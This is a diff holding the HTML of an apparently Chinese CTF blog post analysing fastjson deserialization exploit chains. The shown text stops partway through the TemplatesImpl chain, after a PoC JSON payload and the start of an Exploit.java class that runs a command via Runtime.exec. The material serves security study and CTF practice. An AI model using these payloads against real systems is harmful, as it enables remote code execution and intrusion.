@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>fastjson反序列化总结 | npC4t&#39;s Blog</title>
+    
+    
+        <meta name="keywords" content="java反序列化" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="fastjson反序列化能够利用，得多亏了它的autotype特性，在json中使用@type即可指定反序列化哪个类了，加上在反序列化过程中，fastjson会调用类的setter方法和一些满足条件的getter方法，所以只需找到危险的setter或getter即可 网上可以找到的大概就下面三条利用链,下面一一分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化总结">
+<meta property="og:url" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="npC4t&#39;s Blog">
+<meta property="og:description" content="fastjson反序列化能够利用，得多亏了它的autotype特性，在json中使用@type即可指定反序列化哪个类了，加上在反序列化过程中，fastjson会调用类的setter方法和一些满足条件的getter方法，所以只需找到危险的setter或getter即可 网上可以找到的大概就下面三条利用链,下面一一分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-24-06.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-25-42.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-27-44.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-30_15-50-47.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-30_16-07-02.png">
+<meta property="article:published_time" content="2021-11-29T07:11:35.000Z">
+<meta property="article:modified_time" content="2021-11-30T09:57:17.213Z">
+<meta property="article:author" content="npC4t">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/Snipaste_2021-11-29_22-24-06.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="npC4t&#39;s Blog" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">npC4t&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            CTF
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Nodejs
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/14/%E8%99%8E%E7%AC%A6CTF-2021-Internal-System/">虎符CTF 2021 Internal System</a></li>  <li class="file"><a href="/2021/07/22/buuoj-NodeProxy/">buuoj NodeProxy</a></li>  <li class="file"><a href="/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/">(2021祥云杯)cralwer_z</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            golang web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/29/JMCTF-2021-GoOSS/">(JMCTF 2021)GoOSS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            java web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/04/VNCTF-2021-realezjvav/">VNCTF 2021 realezjvav</a></li>  <li class="file"><a href="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/">(羊城杯 2020)A Piece Of Java</a></li>  <li class="file active"><a href="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">fastjson反序列化总结</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            nosql
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/08/18/GKCTF-2021-hackme/">(GKCTF 2021)hackme</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            other
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">极客大挑战 2019 Http</a></li>  <li class="file"><a href="/2021/09/17/RCTF2021-VerySafe/">(RCTF2021)VerySafe</a></li>  <li class="file"><a href="/2021/10/04/CTF%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/">CTF中ftp协议的利用</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            php代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/14/HCTF-2018-Warmup/">HCTF 2018 Warmup</a></li>  <li class="file"><a href="/2021/01/20/BJDCTF2020-Easy-MD5/">BJDCTF2020 Easy MD5</a></li>  <li class="file"><a href="/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/">极客大挑战 2019 PHP</a></li>  <li class="file"><a href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a></li>  <li class="file"><a href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a></li>  <li class="file"><a href="/2021/07/18/TCTF-0CTF-1linephp/">TCTF-0CTF 1linephp</a></li>  <li class="file"><a href="/2021/09/16/RCTF2021-Easyphp/">(RCTF2021) Easyphp</a></li>  <li class="file"><a href="/2021/11/20/tp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">tp6.0.x反序列化</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            php反序列化
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/24/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/">安洵杯 2019 easy_serialize_php</a></li>  <li class="file"><a href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">(网鼎杯 2018)Fakebook</a></li>  <li class="file"><a href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/">蓝帽杯-One Pointer PHP</a></li>  <li class="file"><a href="/2021/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/">红明谷CTF 2021 EasyTP</a></li>  <li class="file"><a href="/2021/07/27/HFCTF-2021-Final-tinypng/">(HFCTF 2021 Final)tinypng</a></li>  <li class="file"><a href="/2021/07/30/HMBCTF-2021-EzLight/">(HMBCTF 2021)EzLight</a></li>  <li class="file"><a href="/2021/08/05/CISCN2021-Quals-filter/">(CISCN2021 Quals)filter</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            python web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/24/HFCTF-2021-Final-easyflask/">(HFCTF 2021 Final)easyflask</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            sql注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/">极客大挑战 2019 BabySQL</a></li>  <li class="file"><a href="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">CISCN2019 华北赛区 Day2 Web1 Hack World</a></li>  <li class="file"><a href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a></li>  <li class="file"><a href="/2021/07/28/HFCTF-2021-Final-hatenum/">(HFCTF 2021 Final)hatenum</a></li>  <li class="file"><a href="/2021/09/18/RCTF2021-ns-shaft-sql/">(RCTF2021)ns_shaft_sql</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            其他
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/11/15/ctf%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84zip%E6%8B%BFshell%E7%9A%84%E6%93%8D%E4%BD%9C/">ctf中常见的zip拿shell的操作</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            文件上传
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/01/ciscn2021-upload/">ciscn2021 upload</a></li>  <li class="file"><a href="/2021/07/29/JMCTF-2021-UploadHub/">(JMCTF 2021)UploadHub</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            wp
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/HGAME-week1-web%E9%83%A8%E5%88%86/">HGAME week1 web部分</a></li>  <li class="file"><a href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/">DASCTF 三月赛 web题复现</a></li>  <li class="file"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/">CISCN 2021 web 部分wp</a></li>  <li class="file"><a href="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/">DAS x CBCTF 部分web wp</a></li>  <li class="file"><a href="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">GKCTFxDASCTF web部分复现</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            其他
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">WebSecurityAcademy实验室-Http请求走私</a></li>  <li class="file"><a href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Http请求走私（smuggling)学习记录</a></li>  <li class="file"><a href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">SSRF之gopher协议利用</a></li>  <li class="file"><a href="/2021/06/22/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java 反序列化</a></li>  <li class="file"><a href="/2021/07/23/flask-session%E9%97%AE%E9%A2%98/">flask session问题</a></li>  <li class="file"><a href="/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle 反序列化</a></li>  <li class="file"><a href="/2021/09/26/gadgetchains/">gadgetchains</a></li>  <li class="file"><a href="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">nodejs原型链污染</a></li>  <li class="file"><a href="/2021/10/09/%E8%8A%B1%E5%BC%8F%E7%BB%95disable-functons/">花式绕disable_functons</a></li>  <li class="file"><a href="/2021/10/25/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">反弹shell的那些事</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"></a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title"><span>archives</span></h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-fastjson反序列化总结" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/CTF/java-web/">java web</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java反序列化</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2021/11/29/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">
+            <time datetime="2021-11-29T07:11:35.000Z" itemprop="datePublished">2021-11-29</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/fastjson反序列化总结.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/fastjson反序列化总结.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/fastjson反序列化总结.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            fastjson反序列化总结
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><span class="toc-number">1.</span> <span class="toc-text">0x01 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-com-sun-rowset-JdbcRowSetImpl"><span class="toc-number">2.</span> <span class="toc-text">0x02 com.sun.rowset.JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><span class="toc-number">3.</span> <span class="toc-text">0x03 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%B0%88%E8%B0%88%E5%A6%82%E4%BD%95fastjson%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E7%B1%BB%E7%9A%84getter%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">0x04 谈谈如何fastjson如何触发类的getter方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson-gt-1-2-36"><span class="toc-number">4.1.</span> <span class="toc-text">fastjson&gt;&#x3D;1.2.36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson1-2-25-1-2-36"><span class="toc-number">4.2.</span> <span class="toc-text">fastjson1.2.25~1.2.36</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson1-2-22-1-2-24%E4%B8%8D%E7%94%A8%E7%BB%95autoType"><span class="toc-number">4.3.</span> <span class="toc-text">fastjson1.2.22~1.2.24不用绕autoType</span></a></li></ol></li></ol>
+                </div>
+            
+        
+        
+            <p>fastjson反序列化能够利用，得多亏了它的autotype特性，在json中使用<code>@type</code>即可指定反序列化哪个类了，加上在反序列化过程中，fastjson会调用类的setter方法和一些满足条件的getter方法，所以只需找到危险的setter或getter即可</p>
+<p>网上可以找到的大概就下面三条利用链,下面一一分析</p>
+<a id="more"></a>
+
+<ul>
+<li><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
+</li>
+<li><p><code>com.sun.rowset.JdbcRowSetImpl</code></p>
+</li>
+<li><p><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+</li>
+</ul>
+<h3 id="0x01-com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"><a href="#0x01-com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="0x01 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>0x01 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3><p>复现过java其他反序列化链的应该知道，这个类已经是常客了，我们可以通过它来加载class字节码来RCE，主要触发点在它的<code>getOutputProperties</code>方法，详细过程这里就不赘叙了，我们知道，fastjson在反序列化的时候正常是不会触发类的getter方法的，只会触发setter方法，但其实只要满足一定的条件，fastjson也会调用类的getter方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; </span><br><span class="line">Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; </span><br><span class="line">(Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || </span><br><span class="line">AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == </span><br><span class="line">method.getReturnType()))</span><br></pre></td></tr></table></figure>
+<p>前面的条件通常可以满足，就是它会限制方法的返回值类型必须在上面列举的几个之中，而<code>TemplatesImpl</code>的<code>getOutputProperties</code>的返回值类型<code>Properties</code>继承于<code>HashTable</code>，而<code>HashTable</code>是实现了<code>Map</code>接口的，所以符合上面的条件，可以触发</p>
+<p>poc json</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;%s&quot;</span>],</span><br><span class="line">    <span class="attr">&quot;_name&quot;</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>_bytecodes</code>是class字节码的base64编码值（因为到后面加载的时候会用base64解一次码），这个class需要满足条件：继承<code>AbstractTranslet</code></p>
+<p>Exploit.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.npC4t.ser;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> 